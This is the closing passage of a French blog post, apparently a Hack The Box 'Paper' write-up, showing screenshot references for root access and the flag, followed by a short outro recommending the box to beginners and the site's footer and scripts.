accès <code>root</code> :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2022/03/Paper_Root.png data-srcset="/images/2022/03/Paper_Root.png, /images/2022/03/Paper_Root.png 1.5x, /images/2022/03/Paper_Root.png 2x" data-sizes=auto alt=/images/2022/03/Paper_Root.png title="Paper Root"></p><p>Et nous récupérons enfin le <code>flag root</code> :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2022/03/Paper_Root_Flag.png data-srcset="/images/2022/03/Paper_Root_Flag.png, /images/2022/03/Paper_Root_Flag.png 1.5x, /images/2022/03/Paper_Root_Flag.png 2x" data-sizes=auto alt=/images/2022/03/Paper_Root_Flag.png title="Paper Root Flag"></p><h2 id=outro>Outro</h2><p>Cette box était plutôt simple, une très bonne box pour reprendre après plusieurs mois d&rsquo;absence. Elle était aussi assez fun : le header &ldquo;caché&rdquo; était très bien trouvé et m&rsquo;a perdre un temps certain ! Ensuite, le bot du chat était très original et m&rsquo;a bien amusé ! Bref, une super box que je recommande fortement aux débutants.</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Mis à jour le 2022-03-12</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="Partager sur Twitter" data-sharer=twitter data-url=https://www.masoopy.com/fr/htb-paper-sans-metasploit/ data-title="HTB - Paper sans MetaSploit" data-via=nesousx data-hashtags=HTB><i class="fab fa-twitter fa-fw"></i></a><a href=javascript:void(0); title="Partager sur Linkedin" data-sharer=linkedin data-url=https://www.masoopy.com/fr/htb-paper-sans-metasploit/><i class="fab fa-linkedin fa-fw"></i></a><a href=javascript:void(0); title="Partager sur Hacker News" data-sharer=hackernews data-url=https://www.masoopy.com/fr/htb-paper-sans-metasploit/ data-title="HTB - Paper sans MetaSploit"><i class="fab fa-hacker-news fa-fw"></i></a><a href=javascript:void(0); title="Partager sur Reddit" data-sharer=reddit data-url=https://www.masoopy.com/fr/htb-paper-sans-metasploit/><i class="fab fa-reddit fa-fw"></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/fr/tags/htb/>HTB</a></section><section><span><a href=javascript:void(0); onclick=window.history.back();>Retour</a></span>&nbsp;|&nbsp;<span><a href=/fr/>Accueil</a></span></section></div><div class=post-nav><a href=/fr/non-vous-navez-pas-besoin-dun-vpn/ class=prev rel=prev title="Non, vous n'avez pas besoin d'un VPN !"><i class="fas fa-angle-left fa-fw"></i>Non, vous n'avez pas besoin d'un VPN !</a>
+<a href=/fr/htb-backdoor-sans-metasploit/ class=next rel=next title="HTB - Backdoor sans MetaSploit">HTB - Backdoor sans MetaSploit<i class="fas fa-angle-right fa-fw"></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Propulsé par <a href=https://gohugo.io/ target=_blank rel="noopener noreferrer" title="Hugo 0.79.1">Hugo</a> | Thème - <a href=https://github.com/sunt-programator/CodeIT target=_blank rel="noopener noreferrer" title="CodeIT 0.2.10"><i class="fas fa-laptop-code fa-fw"></i>CodeIT</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/fr/ target=_blank rel="noopener noreferrer">Denis G.</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Retour en Haut"><i class="fas fa-arrow-up fa-fw"></i></a><a href=# id=view-comments class=fixed-button title="Afficher les Commentaires"><i class="fas fa-comment fa-fw"></i></a></div><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/lunr/lunr.min.js></script><script type=text/javascript src=/lib/lunr/lunr.stemmer.support.min.js></script><script type=text/javascript src=/lib/lunr/lunr.fr.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/sharer/sharer.min.js></script><script type=text/javascript>window.config={"code":{"copyTitle":"Copier dans le presse-papiers","maxShownLines":10},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/fr/index.json","lunrLanguageCode":"fr","maxResultLength":10,"noResultsFound":"Aucun résultat trouvé","snippetLength":30,"type":"lunr"}};</script><script type=text/javascript src=/js/theme.min.js></script></body></html>
